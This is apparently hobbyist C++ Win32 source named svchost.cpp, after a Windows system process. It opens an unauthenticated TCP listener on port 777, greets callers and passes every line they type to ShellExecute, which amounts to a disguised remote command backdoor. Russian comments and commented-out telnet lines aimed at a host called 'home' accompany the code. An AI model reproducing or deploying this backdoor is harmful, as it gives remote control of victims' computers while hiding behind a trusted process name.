// svchost.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "svchost.h"
#include <winsock2.h> // Wincosk2.h должен быть раньше windows!
#include "winsock.h"
#include "stdio.h"
#include <windows.h>
#include "shellapi.h"

#define MAX_LOADSTRING 100
#define PRINTNUSERS if (nclients) printf("%d user on-line\n",nclients);else printf("No User on line\n");
#define MY_PORT 777 // Порт, который слушает сервер
// Global Variables:
HINSTANCE hInst;
HWND hWnd;// current instance
sockaddr_in local_addr;

TCHAR szTitle[MAX_LOADSTRING];					// The title bar text
TCHAR szWindowClass[MAX_LOADSTRING];			// the main window class name

// Forward declarations of functions included in this code module:
ATOM				MyRegisterClass(HINSTANCE hInstance);
BOOL				InitInstance(HINSTANCE, int);
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
LRESULT CALLBACK	About(HWND, UINT, WPARAM, LPARAM);

DWORD WINAPI SexToClient(LPVOID client_socket);
void myrun(char *command);
int nclients = 0;

int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
 	// TODO: Place code here.
	MSG msg;
	HACCEL hAccelTable;

	// Initialize global strings
	LoadString(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadString(hInstance, IDC_SVCHOST, szWindowClass, MAX_LOADSTRING);
	MyRegisterClass(hInstance);

	// Perform application initialization:
	if (!InitInstance (hInstance, nCmdShow)) 
	{
		return FALSE;
	}

	hAccelTable = LoadAccelerators(hInstance, (LPCTSTR)IDC_SVCHOST);

	// Main message loop:
	while (GetMessage(&msg, NULL, 0, 0)) 
	{
		if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg)) 
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	return (int) msg.wParam;
}



//
//  FUNCTION: MyRegisterClass()
//
//  PURPOSE: Registers the window class.
//
//  COMMENTS:
//
//    This function and its usage are only necessary if you want this code
//    to be compatible with Win32 systems prior to the 'RegisterClassEx'
//    function that was added to Windows 95. It is important to call this function
//    so that the application will get 'well formed' small icons associated
//    with it.
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX); 

	wcex.style			= CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= (WNDPROC)WndProc;
	wcex.cbClsExtra		= 0;
	wcex.cbWndExtra		= 0;
	wcex.hInstance		= hInstance;
	wcex.hIcon			= LoadIcon(hInstance, (LPCTSTR)IDI_SVCHOST);
	wcex.hCursor		= LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground	= (HBRUSH)(COLOR_WINDOW+1);
	wcex.lpszMenuName	= (LPCTSTR)IDC_SVCHOST;
	wcex.lpszClassName	= szWindowClass;
	wcex.hIconSm		= LoadIcon(wcex.hInstance, (LPCTSTR)IDI_SMALL);

	return RegisterClassEx(&wcex);
}

//
//   FUNCTION: InitInstance(HANDLE, int)
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   HWND hWnd;

   hInst = hInstance; // Store instance handle in our global variable

   hWnd = CreateWindow(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, hInstance, NULL);

   if (!hWnd)
   {
      return FALSE;
   }
   	char buff[1024]; // Буфер для различных нужд


	WSAStartup(0x101,(WSADATA *) &buff[0]);
	SOCKET mysocket;
    mysocket=socket(AF_INET,SOCK_STREAM,0);
		
	local_addr.sin_family=AF_INET;
	local_addr.sin_port=htons(MY_PORT); // не забываем о сетевом порядке!!!
	local_addr.sin_addr.s_addr=0; // сервер принимает подключения
	bind(mysocket,(sockaddr *) &local_addr, sizeof(local_addr));
	listen(mysocket, 0x100);
	SOCKET client_socket; // сокет для клиента
	sockaddr_in client_addr; // адрес клиента (заполняется системой)

// функции accept необходимо передать размер структуры
	int client_addr_size=sizeof(client_addr);
	//WinExec("d:\\distr\\telnet\\putty.exe home 777"+0x0,SW_SHOWNORMAL);//start My telnet Client
	//myrun();
	//myrun("c:\\windows\\system32\\telnet.exe home 777");
// цикл извлечения запросов на подключение из очереди
	while((client_socket=accept(mysocket, (sockaddr *) &client_addr, &client_addr_size)))
	{
		nclients++; // увеличиваем счетчик подключившихся клиентов

// пытаемся получить имя хоста
		HOSTENT *hst;
		hst=gethostbyaddr((char *) &client_addr.sin_addr.s_addr,4,AF_INET);

// вывод сведений о клиенте
//		printf("+%s [%s] new connect!\n",(hst)?hst->h_name:"",inet_ntoa(client_addr.sin_addr));
//	PRINTNUSERS

// Вызов нового потока для обслужвания клиента
// Да, для этого рекомендуется использовать _beginthreadex
// но, поскольку никаких вызов функций стандартной Си библиотеки
// поток не делает, можно обойтись и CreateThread
		DWORD thID;

		CreateThread(NULL,NULL,SexToClient,&client_socket,NULL,&thID);
	}


	//	WSAStartup(0x101,(WSADATA *) &buff[0]);
   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   return TRUE;
}

//
//  FUNCTION: WndProc(HWND, unsigned, WORD, LONG)
//
//  PURPOSE:  Processes messages for the main window.
//
//  WM_COMMAND	- process the application menu
//  WM_PAINT	- Paint the main window
//  WM_DESTROY	- post a quit message and return
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	int wmId, wmEvent;
	PAINTSTRUCT ps;
	HDC hdc;

	switch (message) 
	{
	case WM_COMMAND:
		wmId    = LOWORD(wParam); 
		wmEvent = HIWORD(wParam); 
		// Parse the menu selections:
		switch (wmId)
		{
		case IDM_ABOUT:
			DialogBox(hInst, (LPCTSTR)IDD_ABOUTBOX, hWnd, (DLGPROC)About);
			break;
		case IDM_EXIT:
			DestroyWindow(hWnd);
			break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
		}
		break;
	case WM_PAINT:
		hdc = BeginPaint(hWnd, &ps);
		// TODO: Add any drawing code here...
		EndPaint(hWnd, &ps);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

// Message handler for about box.
LRESULT CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_INITDIALOG:
		return TRUE;

	case WM_COMMAND:
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) 
		{
			EndDialog(hDlg, LOWORD(wParam));
			return TRUE;
		}
		break;
	}
	return FALSE;
}
DWORD WINAPI SexToClient(LPVOID client_socket)
{
	SOCKET my_sock;
	my_sock=((SOCKET *) client_socket)[0];
	char buff[1024]="";
	#define sHELLO "Hello Guest!!!\r\nMy server Ready!!!\r\n$>"

// отправляем клиенту приветствие 
	send(my_sock,sHELLO,sizeof(sHELLO),0);
	int i=0;char string[1024]="";

// цикл эхо-сервера: прием строки от клиента и возвращение ее клиенту
	int bytes_recv;
	while( (bytes_recv=recv(my_sock,&buff[0],sizeof(buff),0)) && bytes_recv !=SOCKET_ERROR){
		string[i]=buff[0];
		//printf("first output:{%c}\n\r",buff[0]);
		i++;
		string[i]=0x0;
		if (strncmp(&buff[0],"\r",1)==0){
		string[i-1]=0x0;
		i=0;
		//buff[i]=0x0;
	//	printf ("First ouput:{command=%s}\r\n",string);
		char *p;
		p=&string[0];
		if (strncmp(&string[0],"exit",4)==0){closesocket(my_sock);}
		if (strncmp(&string[0],"x",4)==0){closesocket(my_sock);exit(0);}
		myrun(p);
		//buff[0]=0x0;
		buff[0]=0x24;
		buff[1]='>';
		//printf("%c,%c, %s",buff[0],buff[1],string);
		send(my_sock,&buff[0],2,0);}
	}
// если мы здесь, то произошел выход из цикла по причине 
// возращения функцией recv ошибки - соединение с клиентом разорвано
	nclients--; // уменьшаем счетчик активных клиентов
	//printf("-disconnect\n"); PRINTNUSERS

// закрываем сокет
	closesocket(my_sock);
return 0;
}

void myrun(char *command){
	char command1[]="ipconfig";
	ShellExecute( hWnd,"open",command,NULL, NULL, SW_SHOWNORMAL );

	//WinExec(command,SW_SHOWNORMAL);
	 

	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi = {0};
	BOOL bSuccess;
	//bSuccess = CreateProcess ( NULL, command,
      //                       NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS,
        //                     NULL, NULL, &si, &pi );
}
